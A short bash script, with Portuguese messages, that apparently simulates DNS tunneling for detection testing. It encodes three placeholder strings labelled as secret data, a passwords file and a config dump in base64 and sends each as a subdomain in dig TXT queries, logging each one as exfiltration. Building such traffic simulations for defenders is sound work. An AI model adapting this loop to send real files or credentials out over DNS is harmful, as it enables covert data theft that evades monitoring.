#!/bin/bash
source ./common.cfg
log_event "INICIANDO: Simulação de DNS Tunneling"
# Faz queries TXT longas e anômalas
PAYLOADS=("U2VjcmV0IERhdGEgMQ==" "UGFzc3dvcmRzX2ZpbGU=" "Q29uZmlnX2R1bXA=")
for payload in "${PAYLOADS[@]}"; do
    TARGET="${payload}.dns.google"
    echo "Exfiltrando via DNS: $TARGET"
    dig +short TXT "$TARGET" >/dev/null 2>&1
    sleep 1
done
log_event "CONCLUÍDO: Tunneling finalizado."
